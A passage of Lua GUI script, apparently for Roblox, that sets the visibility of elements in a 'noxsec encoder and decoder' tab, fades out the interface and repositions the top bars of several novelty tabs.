	box["noxsec encoder and decoder tab top bar minimize button"].TextTransparency = 0
	box["noxsec encoder and decoder tab top bar reposition button"].TextTransparency = 0
	box["noxsec encoder and decoder tab top bar"].TextTransparency = 0
	box["noxsec encoder and decoder tab main frame 1"].BackgroundTransparency = 0
	box["noxsec encoder and decoder input"].BackgroundTransparency = 0
	box["noxsec encoder and decoder input"].TextTransparency = 0
	box["noxsec decode"].BackgroundTransparency = 0
	box["noxsec decode"].TextTransparency = 0
	box["noxsec encode"].BackgroundTransparency = 0
	box["noxsec encode"].TextTransparency = 0
	box["clear noxsec encoder and decoder input"].BackgroundTransparency = 0
	box["clear noxsec encoder and decoder input"].TextTransparency = 0
	box["copy noxsec encoder and decoder input"].BackgroundTransparency = 0
	box["copy noxsec encoder and decoder input"].TextTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

task.spawn(function()
	repos(box["donut tab top bar"], 0, 276, 260 + 26)
	repos(box["video tab top bar"], 0, 208, 315 + 26)
	repos(box["gaydar tab top bar"], 0, 376, 230 + 26)
	repos(box["headcanon generator tab top bar"], 0, 446, 168 + 26)
	repos(box["message reverser tab top bar"], 0, 345, 168 + 26)
	repos(box["noxsec encoder and decoder tab top bar"], 0, 545, 268 + 26)
	repos(box["top bar"], 0, 401, 250 + 26)
	repos(box["binary tab top bar"], 0, 246, 230 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

task.spawn(movebutton)

-------------------------------------------------------------------------------------------------------------------------------
